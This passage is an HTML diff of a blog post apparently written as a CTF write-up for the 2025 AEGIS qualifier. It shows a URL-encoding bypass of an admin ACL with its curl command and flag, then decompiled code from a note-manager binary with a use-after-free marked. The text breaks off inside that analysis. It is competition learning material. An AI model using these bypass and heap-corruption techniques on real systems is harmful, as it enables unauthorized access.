@@ -1,0 +1,690 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"copy success(*^▽^*)","fail":"copy failed (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"Naup"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    2025-AEGIS-CTF-writeup |
+    
+    堇姬 Naup&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="2025 神盾杯 Qual - writeup Author: 堇姬 Naup  跟 CakeisTheFake 拿了第三名     高速 speedrun writeup HiProxyACL rules 擋下了訪問 admin直接 urlencode bypasscurl -i https:&#x2F;&#x2F;aegis2025-web-ha.chals.io&#x2F;%61dmin    AEGIS{H77P_r3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025-AEGIS-CTF-writeup">
+<meta property="og:url" content="http://example.com/2025/10/24/2025-AEGIS-CTF-writeup/index.html">
+<meta property="og:site_name" content="堇姬 Naup&#39;s Blog">
+<meta property="og:description" content="2025 神盾杯 Qual - writeup Author: 堇姬 Naup  跟 CakeisTheFake 拿了第三名     高速 speedrun writeup HiProxyACL rules 擋下了訪問 admin直接 urlencode bypasscurl -i https:&#x2F;&#x2F;aegis2025-web-ha.chals.io&#x2F;%61dmin    AEGIS{H77P_r3">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2025/10/24/2025-AEGIS-CTF-writeup/scb.png">
+<meta property="og:image" content="http://example.com/2025/10/24/2025-AEGIS-CTF-writeup/scb1.png">
+<meta property="article:published_time" content="2025-10-24T02:01:05.000Z">
+<meta property="article:modified_time" content="2025-10-24T02:11:34.277Z">
+<meta property="article:author" content="Naup堇姬">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/10/24/2025-AEGIS-CTF-writeup/scb.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="堇姬 Naup's Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/fav.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">Naup...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">Home</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">Archives</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">About</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img fetchpriority="high" src="/images/posts_cover/AEGISCTF/AEGIS-CTF.png" alt="2025-AEGIS-CTF-writeup">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">2025-AEGIS-CTF-writeup</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2025-%E7%A5%9E%E7%9B%BE%E6%9D%AF-Qual-writeup"><span class="toc-number">1.</span> <span class="toc-text">2025 神盾杯 Qual - writeup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HiProxy"><span class="toc-number">2.</span> <span class="toc-text">HiProxy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#n2"><span class="toc-number">3.</span> <span class="toc-text">n2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#analyze"><span class="toc-number">3.1.</span> <span class="toc-text">analyze</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#attack"><span class="toc-number">3.2.</span> <span class="toc-text">attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">3.3.</span> <span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#after-all"><span class="toc-number">3.4.</span> <span class="toc-text">after all</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">84</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">21</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-2025-AEGIS-CTF-writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/10/24/2025-AEGIS-CTF-writeup/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-10-24T02:01:05.000Z" itemprop="datePublished">2025-10-24</time>
+    <time style="display: none;" id="post-update-time">2025-10-24</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="2025-神盾杯-Qual-writeup"><a href="#2025-神盾杯-Qual-writeup" class="headerlink" title="2025 神盾杯 Qual - writeup"></a>2025 神盾杯 Qual - writeup</h1><blockquote>
+<p>Author: 堇姬 Naup</p>
+</blockquote>
+<p>跟 CakeisTheFake 拿了第三名</p>
+<img src="/2025/10/24/2025-AEGIS-CTF-writeup/scb.png" class="">
+
+<img src="/2025/10/24/2025-AEGIS-CTF-writeup/scb1.png" class="">
+
+<p>高速 speedrun writeup</p>
+<h1 id="HiProxy"><a href="#HiProxy" class="headerlink" title="HiProxy"></a>HiProxy</h1><p>ACL rules 擋下了訪問 admin<br>直接 urlencode bypass<br><code>curl -i https://aegis2025-web-ha.chals.io/%61dmin</code>  </p>
+<blockquote>
+<p>AEGIS{H77P_r3QU357_5MU6611N6_5UCC355}</p>
+</blockquote>
+<h1 id="n2"><a href="#n2" class="headerlink" title="n2"></a>n2</h1><h2 id="analyze"><a href="#analyze" class="headerlink" title="analyze"></a>analyze</h2><p>main function 提供了三個功能，add、backup_and_delete、show  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">setup</span>();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;choice);</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( choice &gt; <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">show_note</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">add_note</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">backup_and_delete_note</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">LABEL_12:</span><br><span class="line">        v5 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Invalid choice.&quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Goodbye!&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他首先會先去 malloc 一塊 metadata，大小是 0x18<br>他第一個元素是 show_content 的 function pointer<br>第二個是 note pointer，指向 data 儲存的 chunk<br>第三個是 int size  </p>
+<p>另外他限制了 size 不可以大於 0x800<br>以及分配完後，會將 meta data chunk pointer push back 到 vector 中<br>這個 vector 是一個全域 notes 變數  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">add_note</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  metadata *Mdata; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 cout_Note_added_at_index; <span class="comment">// rbx</span></span><br><span class="line">  __int64 vector_size; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  u32 size; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  metadata *metadata; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Enter note size: &quot;</span>);</span><br><span class="line">  std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x800</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    metadata = (metadata *)<span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( metadata )</span><br><span class="line">    &#123;</span><br><span class="line">      metadata-&gt;func_ptr = show_content;</span><br><span class="line">      metadata-&gt;size = size;</span><br><span class="line">      Mdata = metadata;</span><br><span class="line">      Mdata-&gt;note = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( metadata-&gt;note )</span><br><span class="line">      &#123;</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Enter content: &quot;</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, metadata-&gt;note, size);</span><br><span class="line">        std::vector&lt;Note *&gt;::<span class="built_in">push_back</span>(&amp;notes, &amp;metadata);</span><br><span class="line">        cout_Note_added_at_index = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Note added at index &quot;</span>);</span><br><span class="line">        vector_size = std::vector&lt;Note *&gt;::<span class="built_in">size</span>(&amp;notes);</span><br><span class="line">        v6 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(cout_Note_added_at_index, vector_size - <span class="number">1</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);<span class="comment">// //std::cout &lt;&lt; Note added at index &lt;&lt; notes.size()-1 &lt;&lt; endl;</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Content allocation failed!&quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">free</span>(metadata);                         <span class="comment">// UAF</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Allocation failed!&quot;</span>);<span class="comment">// std::cout&lt;&lt;&quot;Allocation failed&quot;&lt;&lt;endl;</span></span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v0 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Size too large!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v0, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);<span class="comment">// std::cout&lt;&lt;&quot;Size too large&quot; &lt;&lt; endl;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v10 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>backup and delete 邏輯非常簡單，就是指定 index，若 size &lt; 0x200 就會在內心做 backup 之後 free<br>但若大於 0x200 就直接 free<br>不過大於 0x200 的狀況就沒有去清空 vector 中的 pointer，所以有個 UAF  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">backup_and_delete_note</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 idx; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  metadata *ptr; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v14; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Enter note index to backup and delete: &quot;</span>);</span><br><span class="line">  std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;index);</span><br><span class="line">  idx = index;</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= std::vector&lt;Note *&gt;::<span class="built_in">size</span>(&amp;notes) || !*(_QWORD *)std::vector&lt;Note *&gt;::<span class="keyword">operator</span>[](&amp;notes, index) )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    ptr = *(metadata **)std::vector&lt;Note *&gt;::<span class="keyword">operator</span>[](&amp;notes, index);</span><br><span class="line">    <span class="keyword">if</span> ( ptr-&gt;size &lt;= <span class="number">0x200</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Backing up note &quot;</span>);</span><br><span class="line">      v6 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, index);</span><br><span class="line">      v7 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(v6, <span class="string">&quot;...&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      v8 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Backup successful.&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);<span class="comment">// &lt;&lt;backing up note &lt;&lt;index&lt;&lt;...&lt;&lt;endl&lt;&lt;backup successful.&lt;&lt;endl;</span></span><br><span class="line">      <span class="built_in">free</span>(ptr-&gt;note);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      *(_QWORD *)std::vector&lt;Note *&gt;::<span class="keyword">operator</span>[](&amp;notes, index) = <span class="number">0LL</span>;<span class="comment">// notes[idx]=0</span></span><br><span class="line">      v9 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Note &quot;</span>);</span><br><span class="line">      v10 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, index);</span><br><span class="line">      v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(v10, <span class="string">&quot; deleted successfully.&quot;</span>);<span class="comment">// cout&lt;&lt;Note&lt;&lt;idx&lt;&lt;deleted successfully</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Backup failed: Note content is too large to backup.&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span 